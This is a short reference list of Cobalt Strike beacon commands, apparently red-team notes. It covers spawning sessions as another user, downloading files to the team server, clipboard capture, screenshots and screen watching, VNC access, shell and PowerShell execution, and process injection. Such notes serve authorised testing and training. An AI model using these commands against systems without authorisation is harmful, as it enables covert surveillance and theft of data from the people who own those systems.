Generate new session from beacon
- Spawn session as a different user
```cobalt strike
spawn <arch> <type>
spawnas <domain>\<user> <password>
```
Downloading files
- Files are downloaded to team server first > Sync Files to download to machine
```cobalt
download <FILE>
```
View clipboard content
```cobalt
clipboard
```
Registry information
```cobalt
reg query <REGISTRY_KEY>
```
Screenshot (using PrtSc)
```cobalt
printscreen
```
Screenshot (using DLL)
```cobalt
screenshot
```
Screenwatch (tied to beacon sleep time)
```cobalt
screenwatch [pid] <x86|x64>
```
VNC (Explore > Desktop (VNC))
```cobalt
desktop high
```

### Command Shell
Run with cmd.exe
```cobalt
shell whoami /user
```
Execute program directly
```cobalt
run whoami /user
```
Run with PowerShell
- cmdlet and arguments are converted into encoded command before execution
```cobalt
powershell <cmdlet> <arguments>
```
Run with PowerPick
- using unmanaged PowerShell without using PowerShell.exe
```cobalt
powerpick <cmdlet> <args>
```
Run with PsInject
- Inject unmanaged DLL into existing process 
```cobalt
psinject <pid> <arch> <cmdlet> <args>
```
Importing PowerShell script
- Beacon can only hold one import script
```cobalt
powershell-import <PATH_TO_LOCAL_FILE>
```
Run .NET Framework program
- Only .NET Framework not .NET Core/.NET
```cobalt
execute-assembly
```
Run BOF
```cobalt
inline-execute
```